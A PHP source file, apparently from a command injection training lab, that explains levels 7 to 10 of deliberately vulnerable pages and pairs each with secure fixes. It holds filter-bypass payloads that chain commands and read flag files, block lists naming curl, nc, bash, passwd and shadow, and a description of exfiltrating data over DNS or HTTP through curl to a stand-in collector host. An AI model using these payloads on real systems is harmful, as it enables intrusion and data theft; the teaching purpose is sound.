// The parameter names one of a known set of files. Say so, and
// the question of dangerous bytes never arises.
$allowed = [
    'syslog' => '/var/log/syslog',
    'apache' => '/var/log/apache2/error.log',
];

$key = (string)($_GET['logfile'] ?? '');
if (!isset($allowed[$key])) {
    http_response_code(400);
    exit('Unknown log');
}

// No shell, and no need for tail or grep either.
$lines = array_slice(
    file($allowed[$key], FILE_IGNORE_NEW_LINES) ?: [],
    -10
);
foreach (preg_grep('/ERROR/', $lines) as $line) {
    echo htmlspecialchars($line, ENT_QUOTES, 'UTF-8'), "\n";
}
CODE,
        'fix_note' => 'An allowlist of permitted values is finite and can be read for correctness in one
            sitting. A blacklist of dangerous bytes cannot, because the set it has to cover is defined by
            the shell. Where the value genuinely cannot be enumerated, <code>escapeshellarg()</code> is the
            fallback &mdash; and <code>escapeshellcmd()</code> is not, because it leaves the value unquoted
            and therefore still subject to word splitting.',
        'probes' => [
            ['q' => 'What does an unanchored substring check cost an ordinary user?',
             'payload' => 'raid-controller',
             'learn' => 'This names no command and contains no metacharacter, but "raid" contains the two letters <code>id</code>. The trace names the entry that matched.'],
            ['q' => 'Is the newline byte on the list?',
             'payload' => "syslog\necho\tERROR-newline-ran",
             'learn' => 'The word ERROR is in the payload on purpose: the fixed <code>| grep \'ERROR\'</code> suffix is still attached, so only lines containing it come back. Seeing <code>ERROR-newline-ran.log</code> means the newline started a second command line, and the <code>.log</code> on the end shows the suffix is still there.'],
            ['q' => 'Does a # at the start of a word remove the fixed suffix?',
             'payload' => "syslog\necho\tERROR-comment-test\t#",
             'learn' => 'Compare with the previous probe. The output loses its <code>.log</code> and is no longer filtered through grep, because everything from <code>#</code> to the end of the line was discarded. The tab before the <code>#</code> is what makes it the start of a word.'],
        ],
    ];

    $c[8] = [
        'param'       => 'ports',
        'model_title' => 'Five patterns, and what survives all five',
        'model' => <<<'HTML'
<p>Read the five regexes as five claims, then ask what is left when all of them hold at once.</p>
<table class="lk-kv">
    <tr><td><code>/[\&amp;\|`\$\(\)]/i</code></td><td><code>&amp;</code> <code>|</code>
        <code>`</code> <code>$</code> <code>(</code> <code>)</code>. That removes
        <code>&amp;</code> <code>&amp;&amp;</code> <code>|</code> <code>||</code>, both substitution
        forms, and every <code>$</code> expansion including <code>${IFS}</code>. Read the class again:
        <code>;</code> is not in it.</td></tr>
    <tr><td><code>/\b(cat|ls|whoami|id|passwd|shadow|flag)\b/i</code></td><td>those seven as whole words.
        <code>\b</code> is a word boundary, so <code>/bin/cat</code> <em>does</em> match (the slash is a
        non-word character and therefore a boundary) while <code>catalogue</code> does not.</td></tr>
    <tr><td><code>/\b(wget|curl|nc|netcat|bash|sh)\b/i</code></td><td>the same for those six.
        <code>/bin/sh</code> matches.</td></tr>
    <tr><td><code>/\s+/i</code></td><td>PCRE <code>\s</code> is space, tab, newline, carriage return, form
        feed and vertical tab. This removes the newline &mdash; the separator every other level in this lab
        leaves open &mdash; and the tab, which is the word separator level 7 leaves open.</td></tr>
    <tr><td><code>/\.\.\//i</code></td><td>the literal three bytes <code>../</code>.</td></tr>
</table>
<p><strong>What is left.</strong> <code>; &gt; &lt; ! # * ? [ ] { } ' " \ / , : . - + = ~ @ %</code>,
the alphanumerics, and the NUL byte. Read that list looking for a command separator: <code>;</code> is
there, and it is the only one. <code>{a,b}</code> is bash brace expansion and <code>/bin/sh</code> here is
<code>dash</code>, which does not implement it, so that is not a second route.</p>
<p>A separator alone is not enough, because pattern 4 means the second command cannot be given an argument
in the ordinary way &mdash; there is no space, no tab, no newline, and no <code>${IFS}</code> to conjure
one. Two things close that gap:</p>
<table class="lk-kv">
    <tr><td><code>&lt;</code> redirection</td><td><code>nl&lt;/tmp/level8_flag.txt</code> needs no
        whitespace at all: the shell takes everything after <code>&lt;</code> as the redirection target.
        <code>&lt;</code> and <code>&gt;</code> cannot start a program, but they can feed one.</td></tr>
    <tr><td>a trailing <code>;</code></td><td>the template appends <code> localhost 2&gt;&amp;1</code>.
        Without a second <code>;</code> that arrives as an argument to your command
        (<code>nl: localhost: No such file or directory</code>). End the payload with <code>;</code> and
        <code>localhost</code> becomes a third, failing command instead.</td></tr>
</table>
<p><strong>The word-boundary hole.</strong> Pattern 2 is anchored with <code>\b</code>, and <code>_</code>
is a word character, so <code>level8_flag.txt</code> does <em>not</em> match <code>\bflag\b</code> &mdash;
the underscore in front of <code>flag</code> is not a boundary. The filename can be typed out in full here.
Contrast level 4, whose filter uses <code>stripos()</code> and therefore does catch it: the same word list
behaves completely differently depending on how the match is anchored.</p>
<p><code>cat</code> is still blocked, and genuinely so: <code>/bin/cat</code> matches, because the slash
<em>is</em> a boundary. Use a reader that is not on the list &mdash; <code>nl</code>, <code>tac</code>,
<code>od</code>, <code>strings</code>, <code>rev</code>. <code>nmap</code> itself is not installed in this
image, so the first command always fails at exec and the page shows
<code>sh: 1: nmap: not found</code> above your output.</p>
<p>The NUL byte is worth knowing about even though it does not help here. PHP hands the command to
<code>popen()</code> as a C string, so a <code>%00</code> truncates everything after it, including the
fixed <code> localhost 2&gt;&amp;1</code> tail. It removes text; it cannot add a command.</p>
<p><strong>The honest reading of this level.</strong> This is the widest blacklist in the lab. It rejects
<code>80, 443</code> &mdash; ordinary input a user would type &mdash; and it still loses, to one character
its author left out of a class and one anchor that behaves differently from the function used four levels
earlier. A blacklist approaches safety only as it approaches unusability, and even then a single omission
hands the whole capability back. It is the wrong control:
<code>preg_match('/^[0-9,-]{1,64}$/', $ports)</code> plus <code>escapeshellarg($ports)</code> is both safe
and correct, and accepts <code>80,443</code>.</p>
HTML,
        'why' => <<<'HTML'
<p>Your value satisfied all five patterns, so the string that reached <code>/bin/sh</code> was
<code>nmap -sS -p &lt;your value&gt; localhost 2&gt;&amp;1</code>. Five rules removed every whitespace byte,
every expansion and both substitution forms &mdash; and one character class left <code>;</code> out, which
is all a second command needs. The argument arrived through <code>&lt;</code>, which needs no space, and a
trailing <code>;</code> pushed the template's own <code>localhost</code> into a third command where it
could do no harm.</p>
<p>That is the lesson worth keeping. A blacklist wide enough to close command injection is normally also
wide enough to break the feature &mdash; this one rejects <code>80, 443</code> &mdash; and it is still not
the control you want, because being wide is not the same as being complete.
<code>escapeshellarg()</code> plus an allowlist on the value is safe <em>and</em> accepts the input the
tool exists to take.</p>
HTML,
        'fix_bad' => <<<'CODE'
$waf_patterns = [
    '/[\&\|`\$\(\)]/i',
    '/\b(cat|ls|whoami|id|passwd|shadow|flag)\b/i',
    '/\b(wget|curl|nc|netcat|bash|sh)\b/i',
    '/\s+/i',
    '/\.\.\//i',
];

foreach ($waf_patterns as $pattern) {
    if (preg_match($pattern, $ports)) {
        echo 'WAF ALERT: blocked';
        exit;
    }
}

$command = "nmap -sS -p " . $ports . " localhost";
$output  = shell_exec($command . " 2>&1");
CODE,
        'fix_good' => <<<'CODE'
// Validate the shape, then keep the value out of the syntax.
$ports = (string)($_GET['ports'] ?? '');
$one   = '\d{1,5}(-\d{1,5})?';
if (!preg_match('/^' . $one . '(,' . $one . ')*$/', $ports)) {
    http_response_code(400);
    exit('Invalid port specification');
}

// No shell: nmap gets argv, and $ports is exactly one argument
// whatever bytes it contains.
$p = proc_open(
    ['nmap', '-sS', '-p', $ports, '--', 'localhost'],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
$out = stream_get_contents($pipes[1]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);

// String form, if it cannot be avoided:
//   $cmd = 'nmap -sS -p ' . escapeshellarg($ports)
//        . ' -- localhost';
CODE,
        'fix_note' => '<code>escapeshellcmd()</code> is not an alternative to
            <code>escapeshellarg()</code>. It backslash-escapes a fixed set of characters and leaves the
            value unquoted, so a space in the value still splits it into extra arguments, and it escapes
            quote characters only when they are unpaired &mdash; which makes its output depend on the rest
            of the string. Use <code>escapeshellarg()</code> on values, and
            <code>escapeshellcmd()</code> on nothing.',
        'probes' => [
            ['q' => 'Which pattern catches an ordinary port list?',
             'payload' => '80, 443',
             'learn' => 'A space. Pattern 4 is <code>/\s+/i</code>, so the input a user would type by hand is rejected in the same way an attack is. The trace names the pattern.'],
            ['q' => 'How wide is the word-boundary rule?',
             'payload' => '80,catalogue',
             'learn' => '<code>\bcat\b</code> does not match inside <code>catalogue</code>, so this passes; <code>/bin/cat</code> would not, because the slash is a word boundary. Word boundaries limit false positives, not bypasses.'],
            ['q' => 'Is the newline treated as whitespace here?',
             'payload' => "80\n443",
             'learn' => 'Blocked by pattern 4. PCRE <code>\s</code> covers space, tab, newline, carriage return, form feed and vertical tab, which is why the newline separator from level 7 does not carry over.'],
            ['q' => 'Is the semicolon on the metacharacter list?',
             'payload' => '80;true;',
             'learn' => 'It passes. Pattern 1 is <code>/[\&\|`\$\(\)]/i</code> and <code>;</code> is not in the class, so a second command can start. The trailing <code>;</code> is what stops the template\'s own <code> localhost</code> from becoming an argument to it.'],
            ['q' => 'Does the word list really cover the flag file name?',
             'payload' => '80;true</tmp/level8_flag.txt;',
             'learn' => 'It passes. <code>\bflag\b</code> needs a non-word character before <code>f</code>, and the character there is <code>_</code>. Level 4 catches the same name because its filter uses <code>stripos()</code>, which has no notion of a boundary.'],
        ],
    ];

    $c[9] = [
        'param'       => 'pattern',
        'model_title' => 'No in-band channel: what is left is time and the network',
        'model' => <<<'HTML'
<p>The command is <code>netstat -an | grep &lt;you&gt; &gt; /dev/null 2&gt;&amp;1</code> and no filter runs
on the value. Every separator, both substitution forms and all redirection are available, exactly as in
level 1.</p>
<p>The redirection at the end attaches to the last command in whatever chain you build, so
<code>x; curl http://collector.test/</code> has curl's stdout sent to <code>/dev/null</code> too. For an
out-of-band channel that does not matter: the data leaves over the socket, not through stdout.</p>
<p>The page prints the same three lines for every input, so there is no content oracle. Two channels
remain, and one convenience.</p>
<table class="lk-kv">
    <tr><td>time</td><td>the page reports nothing, but the HTTP response still waits for
        <code>shell_exec()</code>, so an injected <code>sleep</code> is measurable from the client. One bit
        per request.</td></tr>
    <tr><td>the network</td><td><code>curl</code>, <code>wget</code>, <code>host</code>, <code>dig</code>
        and <code>ping</code> are installed here. A DNS lookup of a name you construct puts the data in a
        query your authoritative server logs; an HTTP request puts it in a URL your listener logs.</td></tr>
    <tr><td>the bind mount</td><td><code>/var/www/html</code> is this lab directory and is writable by the
        web server user, so <code>x; cp /tmp/level9_flag.txt /var/www/html/out.txt</code> followed by a
        request for <code>/out.txt</code> is two requests. Not out-of-band, but the right way to check that
        your payload shape is correct before you go looking for a collector.</td></tr>
</table>
<p><strong>Encoding, for the DNS channel.</strong> <code>{</code>, <code>}</code> and <code>_</code> are
not valid in DNS labels, so encode before sending. base64 produces <code>+</code>, <code>/</code> and
<code>=</code>, which are also invalid, so either <code>base64 | tr '+/=' '-_.'</code> or a hex dump
(<code>od -An -tx1</code>, or <code>xxd -p</code> where it exists) is the usual choice. A DNS label is
limited to 63 bytes and a full name to 255.</p>
<p><strong>What extraction costs.</strong> A 33-byte flag hex-encoded is 66 bytes, which fits in two
labels, so it leaves in a single lookup: one request. Through the timing oracle instead it is about 7
requests per character, roughly 230 requests. The gap between those two numbers is the whole reason
out-of-band techniques exist.</p>
HTML,
        'why' => <<<'HTML'
<p>No filter ran, so your separator split the command. The <code>&gt; /dev/null 2&gt;&amp;1</code> suffix
silenced stdout, which is why the page did not change; the data left through a channel that does not use
stdout &mdash; a socket, or a file you fetched on a later request.</p>
<p>Discarding output did not reduce what could be done here. It changed the attacker's transport, not
their capability: <code>shell_exec()</code> still ran an arbitrary command as the web server user. "Blind"
is a property of your logging, not of your risk.</p>
HTML,
        'fix_bad' => <<<'CODE'
$command = "netstat -an | grep " . $pattern
         . " > /dev/null 2>&1";
$result  = shell_exec($command);

echo 'Network monitoring completed';
CODE,
        'fix_good' => <<<'CODE'
// No shell, and the pattern never becomes syntax.
$pattern = (string)($_GET['pattern'] ?? '');
if (!preg_match('/^[\w.:-]{1,64}$/', $pattern)) {
    http_response_code(400);
    exit('Invalid pattern');
}

$p = proc_open(
    ['netstat', '-an'],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
$rows = preg_grep(
    '/' . preg_quote($pattern, '/') . '/',
    explode("\n", stream_get_contents($pipes[1]))
);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);

// Defence in depth for the out-of-band half: give the container
// no outbound network it does not need. Egress filtering does
// not fix the injection; it removes one exfiltration channel.
CODE,
        'fix_note' => 'Note what the two halves of the fix do. The argument array removes the vulnerability.
            Egress filtering only removes a channel, and a channel can be replaced &mdash; by timing, by a
            file in the webroot, by anything else the process can touch. Fix the injection first.',
        'probes' => [
            ['q' => 'Is the response time still an oracle when the page says nothing?',
             'payload' => ':80; sleep 2',
             'learn' => 'Time the request. The page is identical either way, and the request takes about two seconds longer. That is the only in-band bit available on this level.'],
            ['q' => 'Does a name lookup leave the container?',
             'payload' => ':80; host example.com',
             'learn' => 'Nothing changes on the page. Compare the response time against a name that cannot resolve: a lookup that answers and one that times out differ measurably, which is how you confirm a DNS channel before trusting it to carry data.'],
            ['q' => 'Does the fixed response depend on the command at all?',
             'payload' => 'zzzz-no-such-pattern',
             'learn' => 'The same three lines appear as for a pattern that matches. Confirming that the body is constant is what rules out a content oracle and sends you to the clock and the network.'],
        ],
    ];

    $c[10] = [
        'param'       => 'process',
        'model_title' => 'A rate limit is not an input filter',
        'model' => <<<'HTML'
<p>The command is <code>timeout 1s ps aux | grep &lt;you&gt; 2&gt;&amp;1</code> and nothing is checked. The
whole shell grammar is available, and unlike levels 5, 6 and 9 the output is returned and printed, so this
is not blind.</p>
<p><strong>Where the timeout applies.</strong> <code>timeout 1s ps aux</code> is the left-hand side of the
pipe, so the one-second limit covers <code>ps aux</code> and nothing else. <code>grep</code> is not
wrapped, and anything you chain after a <code>;</code> or <code>&amp;&amp;</code> is a separate command
with no limit at all.</p>
<p><strong>What the limiter is and is not.</strong> <code>$_SESSION['last_request']</code> is compared
against <code>time()</code> with a two-second window. <code>time()</code> has one-second resolution, so the
real window is between two and three seconds. The session is keyed to the <code>PHPSESSID</code> cookie,
which means the limiter is keyed to something the client chooses: a request that sends no cookie gets a
new, empty session, <code>isset($_SESSION['last_request'])</code> is false, and the check passes. That is
the bypass &mdash; not a race, a fresh cookie jar.</p>
<p><strong>About the race.</strong> The code is a check-then-set with the test on one line and the
assignment on the next, which is the classic time-of-check/time-of-use shape. In this configuration the
gap is closed by the storage layer rather than by the code: PHP's default file session handler holds an
exclusive lock on the session file for the length of each request, so two concurrent requests carrying the
same <code>PHPSESSID</code> are serialised and the second one sees what the first wrote. The same code
behind a session handler that does not lock &mdash; several Redis and database handlers, by default
&mdash; is exploitable as a race.</p>
HTML,
        'why' => <<<'HTML'
<p>No filter exists on this parameter, so the separator you sent ended the <code>grep</code> and started
your own command, outside the <code>timeout 1s</code> that wraps only <code>ps aux</code>.</p>
<p>The two-second limiter constrains a browser tab, not an attacker: it is keyed to a session identifier
the client supplies, so a request without a <code>PHPSESSID</code> cookie creates a fresh session with no
<code>last_request</code> and passes every time. A control the attacker can reset is not a control.</p>
HTML,
        'fix_bad' => <<<'CODE'
if (isset($_SESSION['last_request']) &&
    ($current_time - $_SESSION['last_request']) < 2) {
    echo 'Rate limit exceeded';
    exit;
}
$_SESSION['last_request'] = $current_time;

$command = "timeout 1s ps aux | grep " . $process;
$output  = shell_exec($command . " 2>&1");
CODE,
        'fix_good' => <<<'CODE'
// 1. Fix the injection. The rate limit was never the control
//    that made this safe, and it is a separate concern.
$needle = (string)($_GET['process'] ?? '');
if (!preg_match('/^[\w.-]{1,64}$/', $needle)) {
    http_response_code(400);
    exit('Invalid process name');
}

$p = proc_open(
    ['ps', 'aux'],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
$rows = preg_grep(
    '/' . preg_quote($needle, '/') . '/',
    explode("\n", stream_get_contents($pipes[1]))
);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);

// 2. Key the limiter to something the client cannot discard -
//    the account, or the source address - in shared storage,
//    and make the read-and-increment atomic.
$bucket = 'rl:' . $actor . ':' . intdiv(time(), 2);
$n      = $redis->incr($bucket);
if ($n === 1) {
    $redis->expire($bucket, 4);
}
if ($n > 1) {
    http_response_code(429);
    exit;
}
CODE,
        'fix_note' => 'The two defects are not ranked the way the page implies. A limiter keyed to a cookie
            the client chooses limits nobody. A limiter keyed to an account or a source address would slow
            this down and still leave a remote command execution in place, reachable one request every two
            seconds.',
        'probes' => [
            ['q' => 'Does the rate limiter follow the cookie?',
             'payload' => 'apache',
             'learn' => 'Run this twice within two seconds in the same tab and the second is refused. Run the second from a private window, or with the <code>PHPSESSID</code> cookie removed, and it goes through. The limiter is a property of the session, and the client owns the session identifier.'],
            ['q' => 'What is actually inside the one-second timeout?',
             'payload' => 'apache; sleep 3',
             'learn' => 'The response takes about three seconds. <code>timeout 1s</code> wraps <code>ps aux</code> on the left of the pipe only, so a command chained after the grep is not covered by it.'],
            ['q' => 'Is the output returned, or is this blind like levels 5, 6 and 9?',
             'payload' => 'zzzz; echo output-is-visible',
             'learn' => 'The string appears on the page. Establishing that in one request tells you not to spend time building a timing oracle here.'],
        ],
    ];

    return $c[$level] ?? [];
}

/* =========================================================================
 * Per-level pipeline, computed from the learner's real input
 * ===================================================================== */

function osci_teach_pipeline(int $level, array $ctx): array
{
    $in = (string)($ctx['input'] ?? '');
    if ($in === '') {
        return [];
    }

    [$before, $after] = osci_cmd_parts($level);
    $state   = osci_filter_state($level, $in);
    $command = $before . $in . $after;

    $sinkStage = [
        'label' => 'string handed to shell_exec()  ->  /bin/sh -c',
        'value' => $command,
        'note'  => 'The static text around your value is not negotiable. Everything you can change is '
                 . 'inside the highlighted region of the SINK box below.',
        'verdict' => 'pass',
    ];

    switch ($level) {
        case 1:
            return [
                ['label' => "\$_GET['ip']", 'value' => $in],
                ['label' => 'no filter of any kind is applied', 'value' => $in,
                 'note'  => 'There is no branch between the parameter and the concatenation. '
                          . 'These bytes are the bytes the shell receives.'],
                $sinkStage,
            ];

        case 2:
            $pos = strpos($in, ';');
            return array_values(array_filter([
                ['label' => "\$_GET['service']", 'value' => $in],
                ['label' => "strpos(\$service, ';') !== false", 'value' => $in,
                 'note'  => $pos !== false
                    ? 'Matched <code>;</code> at offset <strong>' . $pos . '</strong>. The request stops '
                    . 'here and <code>shell_exec()</code> is never called. This is the only character the '
                    . 'filter looks at, so every other separator is still untested.'
                    : 'No semicolon present. That is the whole check: <code>&amp;</code>, '
                    . '<code>&amp;&amp;</code>, <code>|</code>, <code>||</code>, a newline, '
                    . '<code>`cmd`</code> and <code>$(cmd)</code> are never examined.',
                 'verdict' => $pos !== false ? 'block' : 'pass'],
                $state['blocked'] ? null : $sinkStage,
            ]));

        case 3:
            $pos   = strpos($in, ' ');
            $tabs  = substr_count($in, "\t");
            $lines = substr_count($in, "\n");
            return array_values(array_filter([
                ['label' => "\$_GET['filename']", 'value' => $in],
                ['label' => "strpos(\$filename, ' ') !== false", 'value' => $in,
                 'note'  => $pos !== false
                    ? 'Matched a 0x20 byte at offset <strong>' . $pos . '</strong>. Note that '
                    . '<code>%20</code> and a literal <code>+</code> in the query string both decode to '
                    . 'this byte before PHP sees it.'
                    : 'No 0x20 byte. Other bytes in <code>$IFS</code> present in this value: '
                    . '<strong>' . $tabs . '</strong> tab, <strong>' . $lines . '</strong> newline. '
                    . 'Neither is checked, and both split words.',
                 'verdict' => $pos !== false ? 'block' : 'pass'],
                $state['blocked'] ? null : $sinkStage,
            ]));

        case 4:
            $kw    = ['cat', 'less', 'more', 'head', 'tail', 'flag', 'passwd', 'shadow'];
            $hit   = $state['blocked'] ? $state['by'] : null;
            $where = $hit !== null ? stripos($in, $hit) : false;
            return array_values(array_filter([
                ['label' => "\$_GET['process']", 'value' => $in],
                ['label' => 'foreach ($blocked as $kw) stripos($process, $kw)', 'value' => $in,
                 'note'  => $hit !== null
                    ? 'Matched <code>' . lk_esc($hit) . '</code> at offset <strong>' . (int)$where
                    . '</strong>, entry <strong>' . ($state['index'] + 1) . '</strong> of 8. The loop '
                    . 'breaks on the first match, so the remaining entries were not reached. The check is '
                    . 'case-insensitive and unanchored.'
                    : 'None of the eight entries (<code>' . implode('</code>, <code>', $kw) . '</code>) '
                    . 'appears in these bytes. The shell has not yet done quote removal, parameter '
                    . 'expansion or globbing, each of which can produce a name that is not here.',
                 'verdict' => $hit !== null ? 'block' : 'pass'],
                $state['blocked'] ? null : $sinkStage,
            ]));

        case 5:
            return [
                ['label' => "\$_GET['email']", 'value' => $in],
                ['label' => 'no filter of any kind is applied', 'value' => $in,
                 'note'  => 'The value is placed inside a command substitution, between <code>echo</code> '
                          . 'and <code>| cut</code>. A separator there starts a new command inside the '
                          . 'substitution, and it still runs.'],
                $sinkStage,
                ['label' => 'shell_exec("echo $?")  ->  a second, independent /bin/sh', 'value' => '0',
                 'note'  => 'A fresh shell has <code>$?</code> = 0 before it runs anything, so this is 0 '
                          . 'for every input. The page prints "Email domain is reachable" unconditionally. '
                          . 'The only oracles on this level are the response time and side effects.'],
            ];

        case 6:
            return [
                ['label' => "\$_GET['service']", 'value' => $in],
                ['label' => 'no filter of any kind is applied', 'value' => $in,
                 'note'  => 'Nothing is inspected. The page suppresses the output, not the execution.'],
                $sinkStage,
                ['label' => 'round(microtime(true) - $start, 2)  ->  printed on the page',
                 'value' => 'the wall-clock duration of the shell above',
                 'note'  => 'Measured around <code>shell_exec()</code> only, so network latency is '
                          . 'excluded. A miss reads 0 or 0.01; a hit reads the length of your sleep. '
                          . '<code>shell_exec()</code> does return the command output, and this page '
                          . 'discards the return value without printing it.'],
            ];

        case 7:
            $chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', ' ', 'cat', 'ls', 'whoami', 'id'];
            $hit   = $state['blocked'] ? $state['by'] : null;
            $where = $hit !== null ? strpos($in, $hit) : false;
            $tabs  = substr_count($in, "\t");
            $lines = substr_count($in, "\n");
            return array_values(array_filter([
                ['label' => "\$_GET['logfile']", 'value' => $in],
                ['label' => 'foreach ($blocked_chars as $char) strpos($logfile, $char)', 'value' => $in,
                 'note'  => $hit !== null
                    ? 'Matched <code>' . lk_esc($hit === ' ' ? '(space)' : $hit) . '</code> at offset '
                    . '<strong>' . (int)$where . '</strong>, entry <strong>' . ($state['index'] + 1)
                    . '</strong> of 14. The loop breaks on the first match. The check is case-sensitive '
                    . 'and unanchored, so the four string entries also reject values that merely contain '
                    . 'those letters.'
                    : 'None of the fourteen entries (<code>' . implode('</code>, <code>', $chars)
                    . '</code>) appears. Bytes present in this value that the list does not mention: '
                    . '<strong>' . $lines . '</strong> newline, <strong>' . $tabs . '</strong> tab. '
                    . 'A newline terminates a command in dash exactly as <code>;</code> does.',
                 'verdict' => $hit !== null ? 'block' : 'pass'],
                $state['blocked'] ? null : $sinkStage,
            ]));

        case 8:
            $desc = [
                '/[\&\|`\$\(\)]/i'                              => 'shell metacharacters: &amp; | ` $ ( ) &mdash; but not ;',
                '/\b(cat|ls|whoami|id|passwd|shadow|flag)\b/i'   => 'seven command / file words, on word boundaries',
                '/\b(wget|curl|nc|netcat|bash|sh)\b/i'           => 'six network and shell words, on word boundaries',
                '/\s+/i'                                        => 'any whitespace: space, tab, newline, CR, FF, VT',
                '/\.\.\//i'                                     => 'the literal bytes ../',
            ];
            $hit = $state['blocked'] ? $state['by'] : null;
            return array_values(array_filter([
                ['label' => "\$_GET['ports']", 'value' => $in],
                ['label' => 'foreach ($waf_patterns as $pattern) preg_match($pattern, $ports)',
                 'value' => $in,
                 'note'  => $hit !== null
                    ? 'Matched pattern <strong>' . ($state['index'] + 1) . '</strong> of 5, '
                    . '<code>' . lk_esc($hit) . '</code> &mdash; ' . ($desc[$hit] ?? '') . '. The loop '
                    . 'breaks here, so the later patterns were not evaluated.'
                    : 'All five patterns are satisfied. Between them they remove every whitespace byte '
                    . 'and every expansion, but the first character class omits <code>;</code>, so this '
                    . 'value can still start a second command. It has to name its target without a space '
                    . '(<code>&lt;</code> redirection) and end with a second <code>;</code>, or the '
                    . 'fixed <code>localhost</code> arrives as an argument. <code>nmap</code> itself is '
                    . 'not installed in this image, so the first command always fails at exec.',
                 'verdict' => $hit !== null ? 'block' : 'pass'],
                $state['blocked'] ? null : $sinkStage,
            ]));

        case 9:
            return [
                ['label' => "\$_GET['pattern']", 'value' => $in],
                ['label' => 'no filter of any kind is applied', 'value' => $in,
                 'note'  => 'Nothing is inspected and nothing is encoded.'],
                $sinkStage,
                ['label' => 'page output', 'value' => 'Network monitoring completed (fixed text)',
                 'note'  => 'The same three lines are printed for every input, so the body carries no '
                          . 'information. <code>&gt; /dev/null 2&gt;&amp;1</code> attaches to the last '
                          . 'command in whatever chain you build.'],
            ];

        case 10:
            $last = $_SESSION['last_request'] ?? null;
            $age  = $last === null ? null : (time() - (int)$last);
            return [
                ['label' => "\$_GET['process']", 'value' => $in],
                ['label' => "\$_SESSION['last_request'] rate limiter (checked before the command is built)",
                 'value' => $last === null
                    ? 'not set for this session - the check passes'
                    : 'set ' . (int)$age . 's ago - the check ' . ($age < 2 ? 'refuses' : 'passes'),
                 'note'  => 'The session is keyed to the <code>PHPSESSID</code> cookie, so this counter '
                          . 'belongs to whoever sends that cookie. A request with no cookie gets an empty '
                          . 'session and the <code>isset()</code> test is false. The limiter never looks '
                          . 'at the value below.'],
                ['label' => 'no filter is applied to $process', 'value' => $in,
                 'note'  => 'Nothing is inspected. The output is returned and printed, so this level is '
                          . 'not blind.'],
                $sinkStage,
            ];
    }
    return [];
}

/** The exact string handed to the shell, attacker-controlled part highlighted. */
function osci_teach_sink(int $level, array $ctx): string
{
    $in = (string)($ctx['input'] ?? '');
    if ($in === '') {
        return '';
    }
    [$before, $after] = osci_cmd_parts($level);
    if ($before === '' && $after === '') {
        return '';
    }
    $state = osci_filter_state($level, $in);
    $label = $state['blocked']
        ? 'Never built - the filter returned before shell_exec()'
        : 'Passed to shell_exec(), which runs /bin/sh -c on it';

    return lk_sink($label, $before, $in, $after);
}

/* =========================================================================
 * Assembly
 * ===================================================================== */

/**
 * @param array $ctx {input: string, solved: bool}
 */
function osci_teach(int $level, array $ctx): string
{
    $c = osci_teach_content($level);
    if (!$c) {
        return '';
    }
    $in     = (string)($ctx['input'] ?? '');
    $solved = !empty($ctx['solved']);

    $out  = '<div class="osci-teach">';
    $out .= lk_model($c['model_title'], $c['model']);

    $pipeline = osci_teach_pipeline($level, $ctx);
    if ($pipeline) {
        $out .= lk_pipeline($pipeline);
        $out .= osci_teach_sink($level, $ctx);
    } else {
        $out .= '<div class="lk-box lk-pipeline"><h4><span class="lk-tag">TRACE</span>What the server did '
              . 'to your input</h4><div class="lk-body"><p class="text-muted">Send something and this will '
              . 'show your value at every stage of the filter, plus the exact string handed to '
              . '<code>/bin/sh</code>. A rejected payload is worth as much as an accepted one, provided '
              . 'you read what stopped it.</p></div></div>';
    }

    if ($solved) {
        $out .= lk_why($c['why']);
    }

    $out .= lk_probes($c['probes'], $c['param'], 'GET', 'level' . $level . '.php');
    $out .= lk_fix($c['fix_bad'], $c['fix_good'], $c['fix_note']);

    return $out . '</div>';
}
